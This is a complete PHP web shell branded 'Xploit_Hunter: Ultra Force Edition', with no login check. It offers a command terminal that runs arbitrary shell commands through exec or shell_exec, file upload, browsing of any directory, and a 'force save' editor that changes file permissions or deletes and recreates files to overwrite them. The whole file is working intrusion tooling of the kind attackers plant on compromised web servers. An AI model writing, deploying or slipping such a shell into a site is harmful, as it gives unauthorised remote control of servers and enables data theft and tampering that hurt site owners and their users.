<?php
/**
 * --- Xploit_Hunter: Ultra Force Edition ---
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "Xploit_Hunter";
$theme_bg = "#0a0a0f";
$theme_fg = "#E0FF00";
$theme_border = "#7D00FF";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    return basename($filename);
}

function exe($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    }
    return "Command execution disabled.";
}

function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    $info = (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? 'x' : '-');
    return $info;
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    header("Location: ?" . http_build_query(['path' => $redirect_path, 'msg_type' => $msg_type, 'msg_text' => $msg_text]));
    exit();
}

// --- SETUP ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- HANDLERS ---
if(isset($_FILES['file_upload'])){
    if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.sanitizeFilename($_FILES['file_upload']['name']))){
        redirect_with_message('success', 'UPLOAD DONE', $path);
    }else{
        redirect_with_message('error', 'UPLOAD FAILED', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target = $_POST['path_target'];
    $current_dir = $_GET['path'];
    if($_POST['opt_action'] == 'edit_save'){
        // --- ULTRA FORCE WRITE LOGIC ---
        @chmod($target, 0666); 
        if(@file_put_contents($target, $_POST['src_content']) !== false){
            redirect_with_message('success', 'SAVE DONE', $current_dir);
        } else {
            // Force bypass: Delete and Recreate
            @unlink($target);
            if(@file_put_contents($target, $_POST['src_content']) !== false){
                redirect_with_message('success', 'FORCE SAVE DONE (Recreated)', $current_dir);
            } else {
                redirect_with_message('error', 'SAVE FAILED: Locked by System', $current_dir);
            }
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<title><?php echo $title; ?></title>
<style>
  body { background-color: #0f0f23; color: #00ffe7; font-family: 'Share Tech Mono', monospace; margin: 0; }
  h1 { color: #ff2bd4; text-align: center; text-shadow: 0 0 5px #ff2bd4; }
  a { color: #00b7ff; text-decoration: none; }
  table { width: 95%; margin: 20px auto; border-collapse: collapse; background: #1a1a2e; border: 1px solid #8000ff; }
  th, td { border: 1px solid #8000ff; padding: 8px; }
  .main-menu { text-align: center; padding: 15px; border-bottom: 1px solid #8000ff; }
  .section-box { border: 2px solid #8000ff; padding: 15px; margin: 20px auto; width: 90%; background: #1a1a2e; }
  input, textarea { background: #000; color: #00ffe7; border: 1px solid #8000ff; padding: 5px; }
  .message { text-align: center; padding: 10px; margin: 10px; font-weight: bold; }
  .message.success { color: #39FF14; } .message.error { color: #FF0033; }
</style>
</head>
<body>
    <h1><?php echo $title; ?></h1>

<?php if(isset($_GET['msg_text'])) echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>

<div class="main-menu">
    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Terminal</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=search_form">Search</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a> |
    <a href="?path=<?php echo urlencode($path); ?>">Home</a>
</div>

<div style="text-align: center; padding: 10px;">
    DIR: <?php 
    $parts = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>';
    $acc = '';
    foreach($parts as $p){ $acc .= '/'.$p; echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($p).'</a>/'; }
    ?>
</div>

<?php
$action = $_GET['action'];
if ($action) {
    echo '<div class="section-box">';
    if($action == 'cmd'){
        echo '<form method="POST"><input type="text" name="cmd" style="width:80%"><input type="submit" value="EXE"></form>';
        if($_POST['cmd']) echo '<pre>'.htmlspecialchars(exe($_POST['cmd'])).'</pre>';
    } elseif($action == 'search_form'){
        echo '<form method="POST">Search Name: <input type="text" name="search_key"><input type="submit" value="FIND"></form>';
    } elseif($action == 'edit_form'){
        $target = $_GET['target_file'];
        echo '<form method="POST" action="?option=true&path='.urlencode($path).'">';
        echo '<textarea name="src_content" style="width:100%; height:400px;">'.htmlspecialchars(@file_get_contents($target)).'</textarea>';
        echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target).'">';
        echo '<input type="hidden" name="opt_action" value="edit_save">';
        echo '<input type="submit" value="FORCE SAVE FILE"></form>';
    }
    echo '</div>';
}

if (!$action || $action == 'search_form') {
    echo '<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        if ($_POST['search_key'] && strpos($item, $_POST['search_key']) === false) continue;
        $full = $path . '/' . $item;
        echo "<tr><td><a href='?path=".urlencode($full)."'>$item</a></td>";
        echo "<td>".(is_dir($full)?'DIR':round(filesize($full)/1024,2).'KB')."</td>";
        echo "<td>".perms($full)."</td>";
        echo "<td><a href='?action=edit_form&target_file=".urlencode($full)."&path=".urlencode($path)."'>Edit</a></td></tr>";
    }
    echo '</table>';
}
?>
</body>
</html>
